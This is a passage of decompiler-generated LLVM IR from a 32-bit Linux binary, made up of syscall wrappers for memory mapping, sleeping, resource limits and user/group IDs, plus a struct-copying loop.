  %v3_80538f0 = inttoptr i32 %v2_80538f0 to i32*
  store i32 %v3_80538ed, i32* %v3_80538f0, align 4
  %v0_80538f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538f3 = load i32, i32* @esi, align 4
  %v2_80538f3 = add i32 %v1_80538f3, 8
  %v3_80538f3 = inttoptr i32 %v2_80538f3 to i32*
  store i32 %v0_80538f3, i32* %v3_80538f3, align 4
  %v0_80538f6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80538f6 = trunc i32 %v0_80538f6 to i16
  %v2_80538f6 = load i32, i32* @esi, align 4
  %v3_80538f6 = add i32 %v2_80538f6, 16
  %v4_80538f6 = inttoptr i32 %v3_80538f6 to i16*
  store i16 %v1_80538f6, i16* %v4_80538f6, align 2
  %v0_80538fa = load i32, i32* @ebx, align 4
  %v1_80538fa = add i32 %v0_80538fa, 18
  %v2_80538fa = inttoptr i32 %v1_80538fa to i8*
  %v3_80538fa = load i8, i8* %v2_80538fa, align 1
  %v4_80538fa = zext i8 %v3_80538fa to i32
  %v5_80538fa = load i32, i32* %eax.global-to-local, align 4
  %v6_80538fa = and i32 %v5_80538fa, -256
  %v7_80538fa = or i32 %v6_80538fa, %v4_80538fa
  store i32 %v7_80538fa, i32* %eax.global-to-local, align 4
  %v2_80538fd = load i32, i32* @esi, align 4
  %v3_80538fd = add i32 %v2_80538fd, 18
  %v4_80538fd = inttoptr i32 %v3_80538fd to i8*
  store i8 %v3_80538fa, i8* %v4_80538fd, align 1
  %v0_8053900 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053900 = load i32, i32* @esp, align 4
  %v2_8053900 = add i32 %v1_8053900, -4
  %v3_8053900 = inttoptr i32 %v2_8053900 to i32*
  store i32 %v0_8053900, i32* %v3_8053900, align 4
  %v0_8053901 = load i32, i32* @ebx, align 4
  %v1_8053901 = add i32 %v0_8053901, 16
  %v2_8053901 = inttoptr i32 %v1_8053901 to i16*
  %v3_8053901 = load i16, i16* %v2_8053901, align 2
  %v4_8053901 = zext i16 %v3_8053901 to i32
  %v1_8053905 = add nsw i32 %v4_8053901, -19
  %v2_8053908 = add i32 %v1_8053900, -8
  %v3_8053908 = inttoptr i32 %v2_8053908 to i32*
  store i32 %v1_8053905, i32* %v3_8053908, align 4
  %v0_8053909 = load i32, i32* @ebx, align 4
  %v1_8053909 = add i32 %v0_8053909, 19
  %v2_805390c = add i32 %v1_8053900, -12
  %v3_805390c = inttoptr i32 %v2_805390c to i32*
  store i32 %v1_8053909, i32* %v3_805390c, align 4
  %v0_805390d = load i32, i32* @esi, align 4
  %v1_805390d = add i32 %v0_805390d, 19
  store i32 %v1_805390d, i32* %eax.global-to-local, align 4
  %v2_8053910 = add i32 %v1_8053900, -16
  %v3_8053910 = inttoptr i32 %v2_8053910 to i32*
  store i32 %v1_805390d, i32* %v3_8053910, align 4
  %v3_8053911 = inttoptr i32 %v2_80538a2 to i16*
  %v4_8053911 = call i32 @function_8053c3a(i16* %v3_8053911, i32 %v3_80538d4, i32 %v3_80538d7)
  store i32 %v4_8053911, i32* %eax.global-to-local, align 4
  %v0_8053916 = load i32, i32* @ebx, align 4
  %v1_8053916 = add i32 %v0_8053916, 16
  %v2_8053916 = inttoptr i32 %v1_8053916 to i16*
  %v3_8053916 = load i16, i16* %v2_8053916, align 2
  %v4_8053916 = zext i16 %v3_8053916 to i32
  store i32 %v2_80538a2, i32* @esi, align 4
  %v2_805391d = add i32 %v4_8053916, %v0_8053916
  store i32 %v2_805391d, i32* @ebx, align 4
  %v0_805391f = load i32, i32* @esp, align 4
  %v1_805391f = add i32 %v0_805391f, 16
  store i32 %v5_8053925, i32* %eax.global-to-local, align 4
  %v7_8053928 = icmp ult i32 %v2_805391d, %v5_8053925
  br i1 %v7_8053928, label %dec_label_pc_8053892, label %dec_label_pc_8053930

dec_label_pc_8053930:                             ; preds = %dec_label_pc_8053879, %dec_label_pc_80538d4, %dec_label_pc_80538ac
  %v0_8053930 = phi i32 [ %v0_80538bf, %dec_label_pc_80538ac ], [ %tmp14, %dec_label_pc_8053879 ], [ %v2_80538a2, %dec_label_pc_80538d4 ]
  store i32 %v0_8053930, i32* %eax.global-to-local, align 4
  %v5_8053932 = sub i32 %v0_8053930, %tmp14
  br label %dec_label_pc_8053935

dec_label_pc_8053935:                             ; preds = %dec_label_pc_80538c4, %dec_label_pc_8053864, %dec_label_pc_8053930
  %storemerge = phi i32 [ %v5_8053932, %dec_label_pc_8053930 ], [ -1, %dec_label_pc_8053864 ], [ -1, %dec_label_pc_80538c4 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805382e, i32* @ebx, align 4
  store i32 %v0_805382c, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8053930, { 1, 0 }
  uselistorder i32 %v2_805391d, { 0, 2, 1 }
  uselistorder i32 %v3_80538d7, { 1, 0 }
  uselistorder i32 %v3_80538d4, { 1, 2, 0 }
  uselistorder i32 %v2_80538a2, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_80538ac30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80538e032, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_8053925, { 2, 3, 0, 1 }
  uselistorder i32 %v5_8053857, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 15, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 17, 0, 18 }
  uselistorder i32 (i16*, i32, i32)* @function_8053c3a, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 19, { 1, 2, 3, 0 }
  uselistorder i32 18, { 1, 2, 3, 0 }
  uselistorder i32 22, { 5, 6, 2, 3, 4, 9, 7, 8, 0, 1 }
  uselistorder i32 -12, { 0, 7, 32, 33, 1, 2, 22, 23, 24, 25, 9, 10, 26, 15, 16, 17, 20, 21, 8, 3, 27, 19, 18, 12, 13, 14, 11, 4, 28, 29, 5, 6, 30, 31 }
  uselistorder i32 -8, { 0, 3, 34, 32, 35, 33, 36, 37, 38, 18, 19, 20, 21, 22, 23, 5, 6, 24, 11, 12, 13, 16, 17, 4, 25, 26, 15, 14, 8, 9, 10, 7, 1, 27, 28, 2, 29, 30, 31 }
  uselistorder i32* @esp, { 18, 19, 20, 5, 6, 7, 8, 9, 170, 175, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 81, 82, 83, 11, 129, 130, 10, 12, 147, 148, 149, 84, 131, 132, 133, 85, 86, 87, 88, 89, 90, 91, 92, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 123, 124, 125, 126, 127, 128, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 176, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 0, 162, 163, 94, 93, 95, 96, 97, 98, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 164, 165, 166, 2, 167, 177, 178, 179, 180, 181, 182, 183, 259, 184, 185, 186, 187, 188, 189, 191, 190, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 168, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 169, 224, 225, 226, 227, 228, 229, 174, 230, 231, 232, 233, 234, 13, 14, 235, 173, 172, 236, 15, 16, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 171, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 17, 258, 1, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 3, 4, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder i32 15, { 2, 1, 3, 0 }
  uselistorder i32 -16, { 0, 9, 55, 56, 37, 2, 3, 38, 39, 40, 41, 16, 13, 14, 15, 42, 43, 22, 24, 23, 25, 26, 27, 28, 33, 34, 35, 36, 11, 12, 4, 44, 45, 31, 32, 29, 30, 17, 18, 19, 20, 21, 1, 5, 46, 6, 10, 47, 48, 7, 8, 50, 49, 51, 52, 53, 54 }
  uselistorder i32 30, { 4, 3, 1, 5, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053935, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053930, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053892, { 1, 0 }
}

define i32 @function_805393d() local_unnamed_addr {
dec_label_pc_805393d:
  %stack_var_-8 = alloca i32, align 4
  %v2_8053940 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8053947 = call i32 @function_80539e7(i32 7, i32 %v2_8053940)
  store i32 256, i32* @edx, align 4
  %v2_8053954 = icmp slt i32 %v2_8053947, 0
  br i1 %v2_8053954, label %dec_label_pc_805395c, label %dec_label_pc_8053958

dec_label_pc_8053958:                             ; preds = %dec_label_pc_805393d
  %v3_8053958 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8053958, i32* @edx, align 4
  br label %dec_label_pc_805395c

dec_label_pc_805395c:                             ; preds = %dec_label_pc_805393d, %dec_label_pc_8053958
  %v0_805395c = phi i32 [ 256, %dec_label_pc_805393d ], [ %v3_8053958, %dec_label_pc_8053958 ]
  ret i32 %v0_805395c

; uselistorder directives
  uselistorder i32 7, { 3, 0, 4, 1, 2, 6, 7, 8, 9, 5 }
  uselistorder label %dec_label_pc_805395c, { 1, 0 }
}

define i32 @function_8053962() local_unnamed_addr {
dec_label_pc_8053962:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053962 = load i32, i32* @ebx, align 4
  store i32 %v0_8053962, i32* %stack_var_-4, align 4
  %v1_805396b = call i32 @int80_syscall(i32 202)
  store i32 %v1_805396b, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_805396b, -4095
  br i1 %tmp7, label %dec_label_pc_8053982, label %dec_label_pc_8053976

dec_label_pc_8053976:                             ; preds = %dec_label_pc_8053962
  %v1_8053976 = call i32 @function_8051a1b(i32 %v0_8053962)
  %v0_805397b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805397b = sub i32 0, %v0_805397b
  %v2_805397d = inttoptr i32 %v1_8053976 to i32*
  store i32 %v1_805397b, i32* %v2_805397d, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053986.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053982

dec_label_pc_8053982:                             ; preds = %dec_label_pc_8053962, %dec_label_pc_8053976
  %v2_8053986 = phi i32 [ %v0_8053962, %dec_label_pc_8053962 ], [ %v2_8053986.pre, %dec_label_pc_8053976 ]
  %v0_8053982 = phi i32 [ %v1_805396b, %dec_label_pc_8053962 ], [ -1, %dec_label_pc_8053976 ]
  store i32 %v2_8053986, i32* @ebx, align 4
  ret i32 %v0_8053982

; uselistorder directives
  uselistorder i32 %v1_805396b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053982, { 1, 0 }
}

define i32 @function_8053988() local_unnamed_addr {
dec_label_pc_8053988:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053988 = load i32, i32* @ebx, align 4
  store i32 %v0_8053988, i32* %stack_var_-4, align 4
  %v1_8053991 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8053991, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053991, -4095
  br i1 %tmp7, label %dec_label_pc_80539a8, label %dec_label_pc_805399c

dec_label_pc_805399c:                             ; preds = %dec_label_pc_8053988
  %v1_805399c = call i32 @function_8051a1b(i32 %v0_8053988)
  %v0_80539a1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80539a1 = sub i32 0, %v0_80539a1
  %v2_80539a3 = inttoptr i32 %v1_805399c to i32*
  store i32 %v1_80539a1, i32* %v2_80539a3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80539ac.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80539a8

dec_label_pc_80539a8:                             ; preds = %dec_label_pc_8053988, %dec_label_pc_805399c
  %v2_80539ac = phi i32 [ %v0_8053988, %dec_label_pc_8053988 ], [ %v2_80539ac.pre, %dec_label_pc_805399c ]
  %v0_80539a8 = phi i32 [ %v1_8053991, %dec_label_pc_8053988 ], [ -1, %dec_label_pc_805399c ]
  store i32 %v2_80539ac, i32* @ebx, align 4
  ret i32 %v0_80539a8

; uselistorder directives
  uselistorder i32 %v1_8053991, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80539a8, { 1, 0 }
}

define i32 @function_80539ae() local_unnamed_addr {
dec_label_pc_80539ae:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80539ae = load i32, i32* @ebx, align 4
  store i32 %v0_80539ae, i32* %stack_var_-4, align 4
  %v1_80539b7 = call i32 @int80_syscall(i32 200)
  store i32 %v1_80539b7, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_80539b7, -4095
  br i1 %tmp7, label %dec_label_pc_80539ce, label %dec_label_pc_80539c2

dec_label_pc_80539c2:                             ; preds = %dec_label_pc_80539ae
  %v1_80539c2 = call i32 @function_8051a1b(i32 %v0_80539ae)
  %v0_80539c7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80539c7 = sub i32 0, %v0_80539c7
  %v2_80539c9 = inttoptr i32 %v1_80539c2 to i32*
  store i32 %v1_80539c7, i32* %v2_80539c9, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80539d2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80539ce

dec_label_pc_80539ce:                             ; preds = %dec_label_pc_80539ae, %dec_label_pc_80539c2
  %v2_80539d2 = phi i32 [ %v0_80539ae, %dec_label_pc_80539ae ], [ %v2_80539d2.pre, %dec_label_pc_80539c2 ]
  %v0_80539ce = phi i32 [ %v1_80539b7, %dec_label_pc_80539ae ], [ -1, %dec_label_pc_80539c2 ]
  store i32 %v2_80539d2, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80539ce

; uselistorder directives
  uselistorder i32 %v1_80539b7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80539ce, { 1, 0 }
}

define i32 @function_80539d4() local_unnamed_addr {
dec_label_pc_80539d4:
  %v0_80539d4 = load i32, i32* @global_var_80556e4.64, align 4
  %v1_80539de = icmp eq i32 %v0_80539d4, 0
  %.v0_80539d4 = select i1 %v1_80539de, i32 4096, i32 %v0_80539d4
  store i32 %.v0_80539d4, i32* @edx, align 4
  ret i32 %.v0_80539d4

; uselistorder directives
  uselistorder i32 4096, { 0, 2, 3, 1 }
}

define i32 @function_80539e7(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80539e7:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80539e7 = load i32, i32* @ebx, align 4
  store i32 %v0_80539e7, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80539fa = call i32 @int80_syscall(i32 191)
  store i32 %v1_80539fa, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_80539fa, -4095
  br i1 %tmp9, label %dec_label_pc_8053a13, label %dec_label_pc_8053a07

dec_label_pc_8053a07:                             ; preds = %dec_label_pc_80539e7
  %v1_8053a07 = call i32 @function_8051a1b(i32 %v0_80539e7)
  %v0_8053a0c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a0c = sub i32 0, %v0_8053a0c
  %v2_8053a0e = inttoptr i32 %v1_8053a07 to i32*
  store i32 %v1_8053a0c, i32* %v2_8053a0e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053a17.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053a13

dec_label_pc_8053a13:                             ; preds = %dec_label_pc_80539e7, %dec_label_pc_8053a07
  %v2_8053a17 = phi i32 [ %v0_80539e7, %dec_label_pc_80539e7 ], [ %v2_8053a17.pre, %dec_label_pc_8053a07 ]
  %v0_8053a13 = phi i32 [ %v1_80539fa, %dec_label_pc_80539e7 ], [ -1, %dec_label_pc_8053a07 ]
  store i32 %v2_8053a17, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053a13

; uselistorder directives
  uselistorder i32 %v1_80539fa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053a13, { 1, 0 }
}

define i32 @function_8053a19() local_unnamed_addr {
dec_label_pc_8053a19:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053a19 = load i32, i32* @ebx, align 4
  store i32 %v0_8053a19, i32* %stack_var_-4, align 4
  %v1_8053a22 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8053a22, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8053a22, -4095
  br i1 %tmp7, label %dec_label_pc_8053a39, label %dec_label_pc_8053a2d

dec_label_pc_8053a2d:                             ; preds = %dec_label_pc_8053a19
  %v1_8053a2d = call i32 @function_8051a1b(i32 %v0_8053a19)
  %v0_8053a32 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053a32 = sub i32 0, %v0_8053a32
  %v2_8053a34 = inttoptr i32 %v1_8053a2d to i32*
  store i32 %v1_8053a32, i32* %v2_8053a34, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053a3d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053a39

dec_label_pc_8053a39:                             ; preds = %dec_label_pc_8053a19, %dec_label_pc_8053a2d
  %v2_8053a3d = phi i32 [ %v0_8053a19, %dec_label_pc_8053a19 ], [ %v2_8053a3d.pre, %dec_label_pc_8053a2d ]
  %v0_8053a39 = phi i32 [ %v1_8053a22, %dec_label_pc_8053a19 ], [ -1, %dec_label_pc_8053a2d ]
  store i32 %v2_8053a3d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053a39

; uselistorder directives
  uselistorder i32 %v1_8053a22, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053a39, { 1, 0 }
}

define i32 @function_8053a3f(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053a3f:
  %esi.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v2_8053a55 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053a55, i32* %esi.global-to-local, align 4
  %v1_8053a6c = call i32 @int80_syscall(i32 140)
  store i32 %v1_8053a6c, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8053a6c, -4095
  br i1 %tmp18, label %dec_label_pc_8053a86, label %dec_label_pc_8053a78

dec_label_pc_8053a78:                             ; preds = %dec_label_pc_8053a3f
  %v2_8053a59 = ashr i32 %tmp8, 31
  %v1_8053a78 = call i32 @function_8051a1b(i32 %v2_8053a59)
  %v0_8053a7d = load i32, i32* %esi.global-to-local, align 4
  %v1_8053a7d = sub i32 0, %v0_8053a7d
  %v2_8053a7f = inttoptr i32 %v1_8053a78 to i32*
  store i32 %v1_8053a7d, i32* %v2_8053a7f, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053a8a

dec_label_pc_8053a86:                             ; preds = %dec_label_pc_8053a3f
  %v1_8053a86 = icmp eq i32 %v1_8053a6c, 0
  br i1 %v1_8053a86, label %dec_label_pc_8053a8f, label %dec_label_pc_8053a8a

dec_label_pc_8053a8a:                             ; preds = %dec_label_pc_8053a86, %dec_label_pc_8053a78
  %v0_8053a8a = phi i32 [ %v1_8053a6c, %dec_label_pc_8053a86 ], [ -1, %dec_label_pc_8053a78 ]
  br label %dec_label_pc_8053a97

dec_label_pc_8053a8f:                             ; preds = %dec_label_pc_8053a86
  %v3_8053a8f = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_8053a97

dec_label_pc_8053a97:                             ; preds = %dec_label_pc_8053a8a, %dec_label_pc_8053a8f
  %v0_8053a9d = phi i32 [ %v0_8053a8a, %dec_label_pc_8053a8a ], [ %v3_8053a8f, %dec_label_pc_8053a8f ]
  ret i32 %v0_8053a9d

; uselistorder directives
  uselistorder i32 %v1_8053a6c, { 1, 2, 0, 3 }
  uselistorder i32 31, { 7, 5, 0, 1, 2, 3, 6, 4 }
  uselistorder i32 140, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053a97, { 1, 0 }
}

define i32 @function_8053a9e(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8053a9e:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053a9f = load i32, i32* @esi, align 4
  store i32 %v0_8053a9f, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8053ab7 = load i32, i32* @ebx, align 4
  %v5_8053abf = call i32* (i32*, i32, i32, i32, ...) @mremap(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  %v6_8053abf = ptrtoint i32* %v5_8053abf to i32
  store i32 %v0_8053ab7, i32* @ebx, align 4
  store i32 %v6_8053abf, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ugt i32* %v5_8053abf, inttoptr (i32 -4096 to i32*)
  br i1 %tmp13, label %dec_label_pc_8053acb, label %dec_label_pc_8053ad7

dec_label_pc_8053acb:                             ; preds = %dec_label_pc_8053a9e
  %v1_8053acb = call i32 @function_8051a1b(i32 %v0_8053ab7)
  %v0_8053ad0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053ad0 = sub i32 0, %v0_8053ad0
  %v2_8053ad2 = inttoptr i32 %v1_8053acb to i32*
  store i32 %v1_8053ad0, i32* %v2_8053ad2, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8053ada.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053ad7

dec_label_pc_8053ad7:                             ; preds = %dec_label_pc_8053a9e, %dec_label_pc_8053acb
  %v2_8053ada = phi i32 [ %v0_8053a9f, %dec_label_pc_8053a9e ], [ %v2_8053ada.pre, %dec_label_pc_8053acb ]
  %v0_8053ad7 = phi i32 [ %v6_8053abf, %dec_label_pc_8053a9e ], [ -1, %dec_label_pc_8053acb ]
  %v2_8053ad9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053ad9, i32* @edx, align 4
  store i32 %v2_8053ada, i32* @esi, align 4
  ret i32 %v0_8053ad7

; uselistorder directives
  uselistorder i32 %v0_8053ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8053ad7, { 1, 0 }
}

define i32 @function_8053add(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053add:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053add = load i32, i32* @ebx, align 4
  store i32 %v0_8053add, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v3_8053af0 = call i32 @munmap(i32* %arg1, i32 %arg2)
  store i32 %v3_8053af0, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v3_8053af0, -4095
  br i1 %tmp10, label %dec_label_pc_8053b09, label %dec_label_pc_8053afd

dec_label_pc_8053afd:                             ; preds = %dec_label_pc_8053add
  %v1_8053afd = call i32 @function_8051a1b(i32 %v0_8053add)
  %v0_8053b02 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053b02 = sub i32 0, %v0_8053b02
  %v2_8053b04 = inttoptr i32 %v1_8053afd to i32*
  store i32 %v1_8053b02, i32* %v2_8053b04, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053b0d.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053b09

dec_label_pc_8053b09:                             ; preds = %dec_label_pc_8053add, %dec_label_pc_8053afd
  %v2_8053b0d = phi i32 [ %v0_8053add, %dec_label_pc_8053add ], [ %v2_8053b0d.pre, %dec_label_pc_8053afd ]
  %v0_8053b09 = phi i32 [ %v3_8053af0, %dec_label_pc_8053add ], [ -1, %dec_label_pc_8053afd ]
  %v2_8053b0b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053b0b, i32* @edx, align 4
  store i32 %v2_8053b0d, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053b09

; uselistorder directives
  uselistorder i32 %v3_8053af0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053b09, { 1, 0 }
}

define i32 @function_8053b0f(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053b0f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_8053b0f = load i32, i32* @ebx, align 4
  store i32 %v0_8053b0f, i32* %stack_var_-4, align 4
  %v4_8053b13 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8053b13, i32* %ebx.global-to-local, align 4
  %v6_8053b22 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8053b22, i32* %ebx.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8053b22, -4095
  br i1 %tmp11, label %dec_label_pc_8053b3b, label %dec_label_pc_8053b2f

dec_label_pc_8053b2f:                             ; preds = %dec_label_pc_8053b0f
  %v1_8053b2f = call i32 @function_8051a1b(i32 %v0_8053b0f)
  %v0_8053b34 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053b34 = sub i32 0, %v0_8053b34
  %v2_8053b36 = inttoptr i32 %v1_8053b2f to i32*
  store i32 %v1_8053b34, i32* %v2_8053b36, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8053b3f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053b3b

dec_label_pc_8053b3b:                             ; preds = %dec_label_pc_8053b0f, %dec_label_pc_8053b2f
  %v2_8053b3f = phi i32 [ %v0_8053b0f, %dec_label_pc_8053b0f ], [ %v2_8053b3f.pre, %dec_label_pc_8053b2f ]
  %v0_8053b3b = phi i32 [ %v6_8053b22, %dec_label_pc_8053b0f ], [ -1, %dec_label_pc_8053b2f ]
  store i32 %v2_8053b3f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8053b3b

; uselistorder directives
  uselistorder i32 %v6_8053b22, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053b3b, { 1, 0 }
}

define i32 @function_8053b41(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053b41:
  %stack_var_-12 = alloca i32, align 4
  %v0_8053b42 = load i32, i32* @ebx, align 4
  %v0_8053b46 = load i32, i32* @global_var_80556f8.71, align 8
  %v1_8053b46 = icmp eq i32 %v0_8053b46, 0
  %v1_8053b51 = icmp eq i1 %v1_8053b46, false
  br i1 %v1_8053b51, label %dec_label_pc_8053b64, label %dec_label_pc_8053b53

dec_label_pc_8053b53:                             ; preds = %dec_label_pc_8053b41
  %v1_8053b58 = call i32 @function_8053d1f(i32 0)
  %v2_8053b60 = icmp slt i32 %v1_8053b58, 0
  br i1 %v2_8053b60, label %dec_label_pc_8053b86, label %dec_label_pc_8053b53.dec_label_pc_8053b64_crit_edge

dec_label_pc_8053b53.dec_label_pc_8053b64_crit_edge: ; preds = %dec_label_pc_8053b53
  %v0_8053b66.pre = load i32, i32* @global_var_80556f8.71, align 8
  br label %dec_label_pc_8053b64

dec_label_pc_8053b64:                             ; preds = %dec_label_pc_8053b53.dec_label_pc_8053b64_crit_edge, %dec_label_pc_8053b41
  %v0_8053b74 = phi i32 [ %v0_8053b66.pre, %dec_label_pc_8053b53.dec_label_pc_8053b64_crit_edge ], [ %v0_8053b46, %dec_label_pc_8053b41 ]
  %v1_8053b64 = icmp eq i32 %arg1, 0
  %v1_8053b6b = icmp eq i1 %v1_8053b64, false
  store i32 %v0_8053b74, i32* @ebx, align 4
  br i1 %v1_8053b6b, label %dec_label_pc_8053b71, label %dec_label_pc_8053b89

dec_label_pc_8053b71:                             ; preds = %dec_label_pc_8053b64
  %v2_8053b76 = add i32 %v0_8053b74, %arg1
  %v1_8053b7a = call i32 @function_8053d1f(i32 %v2_8053b76)
  %v2_8053b82 = icmp slt i32 %v1_8053b7a, 0
  %v1_8053b84 = icmp eq i1 %v2_8053b82, false
  br i1 %v1_8053b84, label %dec_label_pc_8053b71.dec_label_pc_8053b89_crit_edge, label %dec_label_pc_8053b86

dec_label_pc_8053b71.dec_label_pc_8053b89_crit_edge: ; preds = %dec_label_pc_8053b71
  %v0_8053b89.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053b89

dec_label_pc_8053b86:                             ; preds = %dec_label_pc_8053b71, %dec_label_pc_8053b53
  br label %dec_label_pc_8053b89

dec_label_pc_8053b89:                             ; preds = %dec_label_pc_8053b64, %dec_label_pc_8053b71.dec_label_pc_8053b89_crit_edge, %dec_label_pc_8053b86
